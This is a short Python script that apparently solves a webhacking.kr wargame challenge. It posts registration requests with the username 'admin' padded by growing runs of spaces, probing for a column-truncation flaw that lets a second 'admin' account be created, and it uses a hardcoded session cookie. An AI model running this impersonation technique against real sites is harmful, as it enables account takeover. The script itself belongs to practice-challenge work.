import requests

url = "http://webhacking.kr/challenge/bonus/bonus-2/index.php?mode=join"
cookies = {"PHPSESSID": "8374cd9b3e539ffbe463eafced613264"}

for i in range(0,300) :
    uuid = "admin" + " "*i + "somerandomshit"
    pw = "a"
    data = {"uuid":uuid, "pw":pw}
    r = requests.post(url, cookies=cookies, data=data)
    print i
    if "Username already exists" in r.text :
        continue
    else :
        print uuid
        print len(uuid)
        #print r.text
        #break
